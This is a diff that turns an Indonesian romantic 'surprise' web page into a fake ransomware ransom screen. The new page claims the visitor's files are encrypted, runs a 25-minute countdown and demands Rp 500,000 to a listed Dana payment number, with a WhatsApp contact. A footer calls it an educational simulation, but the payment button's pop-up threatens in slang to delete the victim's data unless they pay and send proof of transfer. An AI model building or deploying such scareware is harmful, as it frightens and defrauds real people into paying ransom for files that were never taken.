@@ -3,281 +3,373 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Surprise Untukmu Sayang ❤️</title>
+    <title>Peringatan Keamanan</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Arial Rounded MT Bold', 'Arial', sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #ffafbd, #ffc3a0);
-            height: 100vh;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #fff;
+            min-height: 100vh;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            overflow: hidden;
-            color: #fff;
-            text-align: center;
-        }
-        
-        .container {
-            max-width: 800px;
             padding: 20px;
         }
         
-        .section {
-            display: none;
-            animation: fadeIn 1s ease;
-        }
-        
-        .active {
-            display: block;
-        }
-        
-        h1 {
-            font-size: 2.5rem;
-            margin-bottom: 20px;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
-        }
-        
-        .video-container {
-            width: 100%;
-            max-width: 600px;
-            height: 400px;
-            margin: 0 auto 30px;
+        .warning-container {
+            background: #0f3460;
             border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            max-width: 800px;
+            width: 100%;
             overflow: hidden;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
-            background-color: #000;
+            border: 2px solid #e94560;
         }
         
-        video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
+        .warning-header {
+            background: #e94560;
+            padding: 20px;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
         }
         
-        .message {
-            background-color: rgba(255, 255, 255, 0.2);
-            padding: 25px;
-            border-radius: 15px;
-            margin-top: 20px;
-            backdrop-filter: blur(5px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        .warning-icon {
+            font-size: 2.5rem;
+            animation: pulse 2s infinite;
         }
         
-        .message p {
+        .warning-title {
+            font-size: 1.8rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .warning-content {
+            padding: 30px;
+        }
+        
+        .alert-message {
+            background: rgba(233, 69, 96, 0.2);
+            border-left: 5px solid #e94560;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 0 5px 5px 0;
+        }
+        
+        .countdown {
+            background: #1a1a2e;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            margin: 25px 0;
+        }
+        
+        .countdown-timer {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: #ff0000;
+            margin: 10px 0;
+        }
+        
+        .files-list {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 20px 0;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        
+        .file-item {
+            padding: 8px 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .file-item:last-child {
+            border-bottom: none;
+        }
+        
+        .file-icon {
+            color: #e94560;
+        }
+        
+        .payment-info {
+            background: rgba(15, 52, 96, 0.8);
+            border: 1px dashed #e94560;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        
+        .dana-number {
+            background: #1a1a2e;
+            padding: 12px;
+            border-radius: 5px;
+            font-family: monospace;
+            text-align: center;
+            margin: 10px 0;
+            word-break: break-all;
+            color: #e94560;
+            font-size: 1.5rem;
+        }
+        
+        .whatsapp-number {
+            background: #1a1a2e;
+            padding: 12px;
+            border-radius: 5px;
+            font-family: monospace;
+            text-align: center;
+            margin: 10px 0;
+            word-break: break-all;
+            color: #25D366;
             font-size: 1.2rem;
-            line-height: 1.6;
-            margin-bottom: 15px;
         }
         
-        .heart {
-            color: #ff4d6d;
-            font-size: 2rem;
-            animation: pulse 1.5s infinite;
-            display: inline-block;
-            margin: 0 5px;
+        .warning-footer {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+            gap: 15px;
         }
         
         .btn {
-            background-color: #ff4d6d;
-            color: white;
+            padding: 12px 25px;
             border: none;
-            padding: 12px 30px;
-            font-size: 1.1rem;
-            border-radius: 50px;
+            border-radius: 5px;
+            font-weight: bold;
             cursor: pointer;
-            margin-top: 20px;
             transition: all 0.3s ease;
-            box-shadow: 0 5px 15px rgba(255, 77, 109, 0.4);
+            flex: 1;
+            text-align: center;
         }
         
-        .btn:hover {
-            background-color: #ff3355;
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(255, 77, 109, 0.6);
+        .btn-pay {
+            background: #e94560;
+            color: white;
         }
         
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
+        .btn-pay:hover {
+            background: #c23a52;
+            transform: translateY(-2px);
+        }
+        
+        .btn-contact {
+            background: transparent;
+            border: 1px solid #25D366;
+            color: #25D366;
+        }
+        
+        .btn-contact:hover {
+            background: rgba(37, 211, 102, 0.1);
+        }
+        
+        .disclaimer {
+            margin-top: 30px;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            font-size: 0.9rem;
+            text-align: center;
         }
         
         @keyframes pulse {
             0% { transform: scale(1); }
-            50% { transform: scale(1.2); }
+            50% { transform: scale(1.1); }
             100% { transform: scale(1); }
         }
         
-        .hearts-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: -1;
+        .blink {
+            animation: blink 1s infinite;
         }
         
-        .heart-bg {
-            position: absolute;
-            font-size: 20px;
-            color: rgba(255, 255, 255, 0.5);
-            animation: float 10s infinite linear;
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0.3; }
         }
         
-        @keyframes float {
-            0% {
-                transform: translateY(100vh) rotate(0deg);
-                opacity: 0;
-            }
-            10% {
-                opacity: 1;
-            }
-            90% {
-                opacity: 1;
-            }
-            100% {
-                transform: translateY(-100px) rotate(360deg);
-                opacity: 0;
-            }
+        .urgent-note {
+            background: rgba(255, 0, 0, 0.2);
+            border: 1px solid #ff0000;
+            border-radius: 5px;
+            padding: 10px;
+            margin: 10px 0;
+            text-align: center;
+            font-weight: bold;
+        }
+        
+        .dana-icon {
+            font-size: 2rem;
+            margin-right: 10px;
+        }
+        
+        .whatsapp-icon {
+            font-size: 2rem;
+            margin-right: 10px;
+        }
+        
+        .payment-method {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+        
+        .contact-section {
+            background: rgba(15, 52, 96, 0.8);
+            border: 1px dashed #25D366;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
         }
         
         @media (max-width: 600px) {
-            h1 {
-                font-size: 1.8rem;
+            .warning-footer {
+                flex-direction: column;
             }
             
-            .video-container {
-                height: 300px;
+            .countdown-timer {
+                font-size: 2rem;
             }
             
-            .message p {
-                font-size: 1rem;
+            .warning-title {
+                font-size: 1.5rem;
             }
         }
     </style>
 </head>
 <body>
-    <div class="hearts-bg" id="heartsBg"></div>
-    
-    <div class="container">
-        <div id="intro-section" class="section active">
-            <h1>Halo Sayangku! <span class="heart">❤️</span></h1>
-            <div class="video-container">
-                <video id="intro-video" autoplay muted>
-                    <source src="https://assets.mixkit.co/videos/preview/mixkit-cartoon-birds-on-a-branch-41556-large.mp4" type="video/mp4">
-                    Browser Anda tidak mendukung elemen video.
-                </video>
-            </div>
-            <p>Siap untuk kejutan spesial? <span class="heart">💝</span></p>
-            <button class="btn" id="next-btn-1">Lanjutkan</button>
+    <div class="warning-container">
+        <div class="warning-header">
+            <div class="warning-icon">⚠</div>
+            <h1 class="warning-title">PERINGATAN RANSOMWARE</h1>
         </div>
         
-        <div id="romantic-section" class="section">
-            <h1>Untuk Kita Berdua <span class="heart">💑</span></h1>
-            <div class="video-container">
-                <video id="romantic-video" autoplay muted>
-                    <source src="https://assets.mixkit.co/videos/preview/mixkit-heart-shaped-balloons-flying-in-the-sky-3129-large.mp4" type="video/mp4">
-                    Browser Anda tidak mendukung elemen video.
-                </video>
+        <div class="warning-content">
+            <div class="alert-message">
+                <h2>File Anda Telah Dienkripsi!</h2>
+                <p>Semua file pribadi Anda seperti dokumen, foto, database, dan file lainnya telah dienkripsi dengan algoritma enkripsi yang kuat.</p>
             </div>
-            <button class="btn" id="next-btn-2">Lanjutkan</button>
-        </div>
-        
-        <div id="message-section" class="section">
-            <h1>Pesan Dari Hatiku <span class="heart">💌</span></h1>
-            <div class="message">
-                <p>Setiap hari bersamamu adalah anugerah yang tak ternilai.</p>
-                <p>Kamu mengisi hidupku dengan kebahagiaan, tawa, dan cinta yang tak terbatas.</p>
-                <p>Teruslah menjadi pribadi yang luar biasa seperti sekarang.</p>
-                <p>Ingatlah bahwa kamu kuat, kamu mampu, dan kamu sangat dicintai.</p>
-                <p>Bersamamu, setiap tantangan terasa lebih ringan dan setiap momen lebih berharga.</p>
-                <p>Aku selalu di sini untuk mendukungmu dalam setiap langkah perjalanan hidup kita.</p>
-                <p>Terima kasih telah menjadi bagian terindah dalam hidupku.</p>
-                <p class="heart">❤️</p>
+            
+            <p>Untuk mengembalikan file Anda, Anda harus membayar tebusan melalui Dana. Jika pembayaran tidak dilakukan dalam waktu yang ditentukan, semua file Anda akan dihapus secara permanen.</p>
+            
+            <div class="urgent-note">
+                ⚠ PERINGATAN: Waktu pembayaran sangat terbatas! Hanya 25 menit!
             </div>
-            <button class="btn" id="replay-btn">Lihat Lagi</button>
+            
+            <div class="countdown">
+                <p>Waktu tersisa untuk membayar:</p>
+                <div class="countdown-timer blink">25:00</div>
+                <p>Setelah waktu habis, semua file akan dihapus secara permanen!</p>
+            </div>
+            
+            <div class="files-list">
+                <h3>File yang Terkena Dampak:</h3>
+                <div class="file-item">
+                    <span class="file-icon">📷</span>
+                    <span>Foto_Keluarga.jpg</span>
+                </div>
+                <div class="file-item">
+                    <span class="file-icon">📄</span>
+                    <span>Dokumen_Penting.pdf</span>
+                </div>
+                <div class="file-item">
+                    <span class="file-icon">💼</span>
+                    <span>Laporan_Keuangan.xlsx</span>
+                </div>
+                <div class="file-item">
+                    <span class="file-icon">🎬</span>
+                    <span>Video_Keluarga.mp4</span>
+                </div>
+                <div class="file-item">
+                    <span class="file-icon">📝</span>
+                    <span>Tugas_Kuliah.docx</span>
+                </div>
+                <div class="file-item">
+                    <span class="file-icon">🔒</span>
+                    <span>Dan 1.247 file lainnya...</span>
+                </div>
+            </div>
+            
+            <div class="payment-info">
+                <div class="payment-method">
+                    <span class="dana-icon">💳</span>
+                    <h3>Instruksi Pembayaran Dana:</h3>
+                </div>
+                <p>Untuk mendekripsi file Anda, kirim <strong>Rp 500.000</strong> ke nomor Dana berikut:</p>
+                <div class="dana-number">08816615715</div>
+                <p>Setelah pembayaran dikonfirmasi, Anda akan menerima kunci dekripsi untuk memulihkan file Anda.</p>
+            </div>
+            
+            <div class="contact-section">
+                <div class="payment-method">
+                    <span class="whatsapp-icon">💬</span>
+                    <h3>Hubungi Kami Melalui WhatsApp:</h3>
+                </div>
+                <p>Jika Anda memiliki pertanyaan atau sudah melakukan pembayaran, hubungi kami melalui WhatsApp di nomor berikut:</p>
+                <div class="whatsapp-number">6283862722713</div>
+                <p>Kirim bukti transfer setelah pembayaran untuk mendapatkan kunci dekripsi.</p>
+            </div>
+            
+            <div class="warning-footer">
+                <button class="btn btn-pay" onclick="showPaymentInstructions()">Bayar Tebusan</button>
+                <button class="btn btn-contact" onclick="redirectToWhatsApp()">Hubungi Kami</button>
+            </div>
+            
+            <div class="disclaimer">
+                <p><strong>PENTING:</strong> Ini hanyalah simulasi untuk tujuan edukasi. Jangan pernah membayar tebusan ransomware sungguhan. Selalu backup data penting Anda dan gunakan perangkat lunak keamanan yang terpercaya.</p>
+            </div>
         </div>
     </div>
 
     <script>
-        // Membuat efek hati berjatuhan di latar belakang
-        const heartsBg = document.getElementById('heartsBg');
-        const hearts = ['❤️', '💖', '💕', '💗', '💓', '💞', '💘'];
-        
-        function createHeart() {
-            const heart = document.createElement('div');
-            heart.classList.add('heart-bg');
-            heart.innerHTML = hearts[Math.floor(Math.random() * hearts.length)];
-            heart.style.left = Math.random() * 100 + 'vw';
-            heart.style.animationDuration = (Math.random() * 10 + 10) + 's';
-            heart.style.fontSize = (Math.random() * 20 + 15) + 'px';
-            heartsBg.appendChild(heart);
+        // Timer countdown 25 menit (hanya simulasi)
+        function updateCountdown() {
+            const timerElement = document.querySelector('.countdown-timer');
+            let time = 25 * 60; // 25 menit dalam detik
             
-            setTimeout(() => {
-                heart.remove();
-            }, 15000);
+            setInterval(() => {
+                if (time <= 0) return;
+                
+                time--;
+                
+                const minutes = Math.floor(time / 60);
+                const seconds = time % 60;
+                
+                timerElement.textContent = 
+                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                    
+                // Ubah warna menjadi merah terang saat waktu hampir habis
+                if (time < 300) { // Kurang dari 5 menit
+                    timerElement.style.color = '#ff0000';
+                    timerElement.style.textShadow = '0 0 10px #ff0000';
+                }
+            }, 1000);
         }
         
-        // Membuat hati berjatuhan setiap 300ms
-        setInterval(createHeart, 300);
-        
-        // Navigasi antar section
-        const introSection = document.getElementById('intro-section');
-        const romanticSection = document.getElementById('romantic-section');
-        const messageSection = document.getElementById('message-section');
-        
-        const introVideo = document.getElementById('intro-video');
-        const romanticVideo = document.getElementById('romantic-video');
-        
-        const nextBtn1 = document.getElementById('next-btn-1');
-        const nextBtn2 = document.getElementById('next-btn-2');
-        const replayBtn = document.getElementById('replay-btn');
-        
-        // Fungsi untuk beralih ke section berikutnya
-        function showNextSection(current, next) {
-            current.classList.remove('active');
-            next.classList.add('active');
+        function showPaymentInstructions() {
+            alert("bayar mek ga bayar data data mu gw hapus permanent, jika sudah bayar tolong kasih bukti tf nya ke xyzz biar data data mu ga jadi di hapus permanent");
         }
         
-        // Event listeners untuk tombol navigasi
-        nextBtn1.addEventListener('click', () => {
-            showNextSection(introSection, romanticSection);
-            romanticVideo.play();
-        });
+        function redirectToWhatsApp() {
+            // Membuka WhatsApp dengan nomor yang telah ditentukan
+            window.open('https://wa.me/6283862722713', '_blank');
+        }
         
-        nextBtn2.addEventListener('click', () => {
-            showNextSection(romanticSection, messageSection);
-        });
-        
-        replayBtn.addEventListener('click', () => {
-            showNextSection(messageSection, introSection);
-            introVideo.currentTime = 0;
-            introVideo.play();
-        });
-        
-        // Otomatis lanjut ke video romantis setelah intro selesai
-        introVideo.addEventListener('ended', () => {
-            // Memberi jeda 1 detik sebelum pindah ke section berikutnya
-            setTimeout(() => {
-                showNextSection(introSection, romanticSection);
-                romanticVideo.play();
-            }, 1000);
-        });
-        
-        // Otomatis lanjut ke pesan motivasi setelah video romantis selesai
-        romanticVideo.addEventListener('ended', () => {
-            // Memberi jeda 1 detik sebelum pindah ke section berikutnya
-            setTimeout(() => {
-                showNextSection(romanticSection, messageSection);
-            }, 1000);
-        });
+        // Mulai countdown saat halaman dimuat
+        document.addEventListener('DOMContentLoaded', updateCountdown);
     </script>
 </body>
 </html>
